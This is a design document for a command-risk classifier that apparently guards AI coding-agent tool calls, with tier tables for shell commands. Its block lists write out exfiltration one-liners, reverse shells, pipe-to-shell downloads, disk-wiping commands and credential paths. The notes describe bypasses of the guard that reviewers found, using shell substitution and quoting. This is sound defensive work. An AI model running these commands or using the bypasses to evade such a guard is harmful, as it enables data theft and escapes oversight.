# ccvet Layer 0/1 Risk Taxonomy

Goal: classify as much real-world traffic as possible with zero model calls. Layer 2 (LLM) should only ever see the leftover gray zone. Every row here ships in the default `policy.yaml` as a starting point users can edit.

Four verdicts:
- **AUTO**: auto-approve, no prompt, no log noise beyond a one-line audit entry.
- **ASK**: mutating but reversible, local-scope; surfaced to the user with a one-line reason.
- **BLOCK**: irreversible, system-wide, network-exfil-shaped, or credential-touching. No LLM verdict can override this tier; it's the safety floor.
- **GRAY**: doesn't match any rule; falls through to Layer 2 if configured, otherwise defaults to ASK.

## Filesystem and inspection
| Verdict | Examples |
|---|---|
| AUTO | `ls`, `pwd`, `cat`, `less`, `head`, `tail`, `grep`/`rg`/`ag` (no `-exec`), `find` (no `-delete`/`-exec`/`-execdir`/`-ok`/`-okdir`), `file`, `stat`, `wc`, `diff`, `tree`, `du`, `df`, `which`, `type` |
| ASK | `mkdir`, `touch`, `cp`/`mv` within project, `chmod` (non-777, within project), `ln -s`, `env` (could print secrets, so ask, not auto) |
| BLOCK | `rm -rf /`, `/var`, `/opt`, `/Applications`, `/Library`, `/root`, and the other top-level system directories; `rm -rf ~`, a literal `/Users/<name>` or `/home/<name>` home-directory root, or a bare `*`/`.*` wildcard; `chmod -R 777 /` (octal) or `chmod -R a+rwx /` (symbolic, same effect); `chown -R` on system paths; `dd if=... of=/dev/sdX`; `mkfs.*`; `diskutil eraseDisk` |

## Git
| Verdict | Examples |
|---|---|
| AUTO | `git status`, `git diff`, `git log`, `git show`, `git blame`, `git branch` (list), `git remote -v`/`show` (not add/remove/set-url), `git stash list`, `git fetch`, `git describe`, `git tag -l`/`git tag <name>` (list or create, not `-d`/`--delete`) |
| ASK | `git add`, `git commit`, `git checkout -b`, `git merge` (non-force), `git pull`, `git rebase` (local, unpushed), `git stash pop`, `git remote add`/`remove`/`rm`/`set-url`/`rename`/`prune` (can redirect future pushes to an attacker-controlled remote), `git tag -d`/`--delete` |
| BLOCK | `git push --force`/`--force-with-lease` to `main`/`master`/protected branches, `git reset --hard`, `git clean -fdx`, `git branch -D` on protected branches, `git push origin --delete <protected>`, `git filter-branch`/`filter-repo` |

`git remote` and `git tag` were originally treated as blanket read-only, with no check on their mutating sub-forms (`remote add/remove/set-url`, `tag -d`). Flagged by an external review and fixed: these two now have the same flag-sensitive handling as `push`/`reset`/`clean`/`branch` always did.

## Package managers and dependencies
| Verdict | Examples |
|---|---|
| AUTO | `npm list`, `npm view`, `pip show`, `pip list`, `pip freeze`, `cargo check`, `go list`, `brew info` |
| ASK | `npm install`/`pip install` (new deps), `npm uninstall`, `cargo add`, `go get`, `brew install` |
| BLOCK | `npm publish`, `twine upload`/`pip upload`, `curl <url> \| sh`/`bash`, `wget -O- <url> \| sh`, anything piping a download straight into a shell |

## Build, test, and lint
| Verdict | Examples |
|---|---|
| AUTO | `tsc --noEmit`, `eslint` (no `--fix`), `pytest --collect-only`, `cargo check`, `go vet` |
| ASK | `npm run <script>` (opaque, so ask by default), `make`, `pytest` (real run, side effects possible), `eslint --fix`, `cargo build`/`run`, `docker build` |
| GRAY | Arbitrary `./script.sh` with unknown contents. No pattern to match; defer to Layer 2 or ASK. |

## Process and system
| Verdict | Examples |
|---|---|
| AUTO | `ps`, `top` (read), `uname`, `whoami`, `id`, `uptime` |
| ASK | `kill <pid>` (specific, non-critical), `killall <user-process>` |
| BLOCK | `sudo` anything, `kill -9 1`, broad `killall -9`/`pkill -f .`, `systemctl stop/disable` on core services, `launchctl unload` on system daemons, `crontab -r` |

## Network
| Verdict | Examples |
|---|---|
| ASK | plain `curl`/`wget` GET (no pipe to shell), `ping`, `dig`/`nslookup` |
| BLOCK | download piped to shell (see package managers), exfil-shaped commands (`tar czf - ~/.ssh \| curl -T - https://...`, `cat <secret> \| curl -d @- <host>`), reverse shells (`nc -e /bin/sh`, `bash -i >& /dev/tcp/...`) |

## Secrets and credentials
| Verdict | Examples |
|---|---|
| BLOCK (always, regardless of read vs write, including as a shell redirect target) | any path under `~/.ssh/id_*`, `~/.aws/credentials`, `~/.config/gcloud`, `/etc/passwd`, `/etc/shadow`, `.env`, `.netrc`, `.npmrc`, `.pypirc`, `.envrc`, as a plain argument, as input to a command (`cat secret \| cmd`), or as a redirect target (`cmd < ~/.aws/credentials`, `cmd >> ~/.ssh/authorized_keys`) |
| BLOCK, overridable | anything matching `*token*`/`*secret*`/`*credential*` **combined with** a network call in the same command. Fuzzy name-based matching can false-positive on two unrelated sub-commands sharing one compound statement, so unlike the exact-path match above, this one can be promoted past with `ccvet allow` once reviewed. |

Path matching (both here and for Edit/Write tool calls) is component-aware, not a raw substring search on the resolved path: `/etc/passwd` matches an actual file named `passwd` inside an `etc` directory, not `/etc/passwd_notes.md`. Redirect targets (`>`, `>>`, `<`, `<<<`) are checked the same way as Edit/Write paths, since a secret or persistence path used only as a redirect target never appears in a command's argument list at all.

`.env`/`.netrc`/`.npmrc`/`.pypirc`/`.envrc` were missing from this list entirely until an external review flagged it: `.env` in particular is arguably the single most common real-world location for secrets in an actual project, more so than several entries that were already covered. A follow-up review then caught that the Bash-argument version of this check was a raw substring match rather than component-aware like the Edit/Write path check: `cat .env.example`/`.env.local`/`.env.sample` (common, safe conventions for documenting required variables, not real secrets) were denied. Both now use the same component-aware matcher.

**Dynamic arguments.** A command's own name being dynamically constructed (`$(echo rm) -rf /`) was already denied outright, but an *argument* being dynamically constructed was not checked at all: `cat $(ls -d ~/.ssh)/id_rsa` has a perfectly ordinary, recognized command name ("cat"), and the raw argument text `$(ls -d ~/.ssh)/id_rsa` doesn't contain `.ssh/id_` as a contiguous substring (the closing paren breaks it), so this classified straight to `allow`. Also found by external review. Fixed: any extracted command whose argument contains a substitution or variable expansion that isn't *purely* a self-contained command/process substitution (i.e. not just `<(ls -la)` as the whole argument, where the inner command is independently classified anyway) now caps the result at `ask` instead of `allow`, regardless of which program is being called.

**Dynamic redirect targets.** A second round of external review found the same bypass shape one level deeper: `cat myfile > $(echo ~/.bashrc)` has a redirect target that was extracted as the raw, unexpanded text `$(echo ~/.bashrc)`, matching no literal pattern, with no dynamic-content check applied to redirect targets at all (only argv words had one). Fixed, and treated more strictly than a dynamic argument: a redirect target containing *any* substitution or variable expansion, including a "pure" one like `$(mktemp)` with nothing concatenated, is denied outright rather than downgraded to `ask`. The reasoning differs from the argv case: classifying `<(ls -la)` tells us exactly what `cat` reads (the inner command's output), but there's no equivalent way to verify what a redirect *target* resolves to without actually running the substitution, since the inner command's output becomes a destination path, not data we can inspect. Tilde expansion is still excluded (predictable, not a substitution).

## Database
| Verdict | Examples |
|---|---|
| ASK | `SELECT`, `INSERT`, `UPDATE ... WHERE` (scoped) |
| BLOCK | `DROP DATABASE`/`DROP TABLE`, `TRUNCATE`, `DELETE FROM <table>` with no `WHERE`, `UPDATE` with no `WHERE` |

The WHERE check is scoped to the specific DELETE/UPDATE statement (up to the next `;` or closing quote), not the whole command text, so an unrelated WHERE elsewhere in a multi-statement command (`psql -c "DELETE FROM users" -c "... WHERE ..."`) doesn't mask a genuinely unconditional delete.

## Cloud and infra CLIs
| Verdict | Examples |
|---|---|
| ASK | `aws s3 ls`, `aws s3 cp` (a few files), `kubectl get`, `kubectl apply`, `terraform plan` |
| BLOCK | `terraform destroy`, `aws s3 rm --recursive`, `kubectl delete namespace`/`--all`, `gcloud ... delete`, IAM key creation on root/admin accounts |

## Obfuscation heuristics (Layer 1, pattern-based, not just literal string match)
These exist because a determined bad actor (or a confused model) won't always spell the dangerous command literally:
- base64/hex decode piped to a shell (`echo <b64> | base64 -d | sh`)
- command reconstructed from `$(...)`/env-var concatenation right before execution
- **Rule**: any decode-then-pipe-to-shell shape gets BLOCK regardless of what's inside. Hiding the payload from static review is itself the risk signal, independent of content.

**Engineering note**: this tier only works if commands are tokenized with a real shell parser (`bashlex`/`shlex`), not matched as raw strings. Naive regex on the literal text misses `cmd1 && cmd2`, quoted/escaped variants, and command substitution. The matcher must split compound commands (`&&`, `;`, `|`, `$(...)`) into sub-commands, classify each independently, and take the **highest** risk tier found. A pipeline is only as safe as its most dangerous segment (e.g. `grep foo file | rm -rf bar` must not slip through because `grep` alone is AUTO).

## Beyond Bash: other Claude Code tool calls
The taxonomy above is shell-command-centric, but `PreToolUse` fires for every tool, not just Bash. These need their own rules:

| Tool | Verdict | Notes |
|---|---|---|
| `Read`, `Grep`, `Glob` | AUTO | Already read-only by construction, except reads from the secrets paths above, which stay BLOCK/ASK even for reads. |
| `Edit`/`Write`/`NotebookEdit` on normal project files | ASK (default) | Path resolved to its real, symlink-free location first (see below). AUTO is reasonable to promote once trust is established, but not the v1 default. |
| `Edit`/`Write` on build/CI/package manifests | ASK, flagged distinctly | `package.json` (especially new `scripts`/`postinstall`/`preinstall` entries), `.npmrc`, `pyproject.toml` build-system, `Pipfile`, `.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`, `Dockerfile`. These can grant CI secrets access or inject code that runs on someone else's machine later, so they're a supply-chain vector, not just a local file edit. |
| `Edit`/`Write` on persistence/backdoor vectors | BLOCK | `.git/hooks/*`, `~/.bashrc`/`~/.zshrc`/`~/.profile`/`~/.bash_profile`, `crontab` edits, `~/Library/LaunchAgents/*.plist` (macOS), systemd user unit files. Writing here configures *future* execution, which is the classic persistence pattern, so it's treated as BLOCK even though "just writing a file" looks harmless. |
| `Edit`/`Write` outside the project root | BLOCK (default), ASK if explicitly scoped by the user | Resolved via realpath before the scope check; `../../` traversal and symlinks must not bypass the project-root boundary. |
| `WebFetch`/`WebSearch` | ASK / AUTO | `WebSearch` (no page content fetched) can be AUTO. `WebFetch` of an arbitrary URL is ASK by default, since it's a network call that can also be a prompt-injection vector if the fetched page tries to steer the agent. |
| `Task`/`Agent` (spawning a subagent) | ASK | Kicks off autonomous work that may itself make further tool calls. Visibility matters here even if each individual sub-action would otherwise be AUTO. |
| Any other/unknown MCP tool | GRAY, defaults to ASK | No built-in opinion on a third-party MCP tool's risk. Defaults to ASK rather than AUTO for anything ccvet doesn't recognize; this is the generic fallback, separate from the Bash-specific GRAY case below. |

## Scope notes
- **POSIX shells only for v1.** The taxonomy above targets bash/zsh on macOS and Linux. Windows/PowerShell equivalents (`Remove-Item -Recurse -Force`, `Format-Volume`, `icacls`, `Start-Process -Verb RunAs`) are a deliberate non-goal for the first release, not an oversight. This is called out in the README rather than silently under-covered.
- **`case`, `select`, `coproc`, `[[ ... ]]` test expressions, and arithmetic `for ((...))` loops aren't parseable by bashlex at all.** This is a library limitation, not something fixable in ccvet's own code. Each one fails to parse and falls to `ask` ("could not parse as shell syntax"), not `allow`. Safe, just not actively classified; noted here rather than silently missing. All other compound constructs (brace groups `{ ...; }`, subshells `(...)`, `if`/`while`/`for`, process substitution `<(...)`/`>(...)`, and the transparent wrappers `eval`/`exec`/`command`/`builtin`) parse correctly and are fully classified as of the Phase 5 hardening fixes.
- **ANSI-C quoting (`$'...'`) around a flag argument can evade the exact-flag-string checks in the hard-coded guards.** For example, `rm $'-rf' /` downgrades from the expected `deny` to `ask`, because bashlex mis-parses `$'-rf'` as a parameter expansion rather than dequoting it to the literal string `-rf`, so the catastrophic-rm check's `arg.startswith("-")` test never matches. This is a bashlex parsing limitation, not an unlimited bypass: the result still fails toward `ask`, never silently toward `allow`. Normal single and double quotes (`'-rf'`, `"-rf"`) are dequoted correctly and are not affected.

## What stays GRAY on purpose
Anything that's a mutating action with no clean pattern match: a novel one-off shell one-liner, an unfamiliar CLI tool, a script whose contents weren't inspected. These are exactly what Layer 2 is for. Without Layer 2 configured, they fall back to ASK, never AUTO.
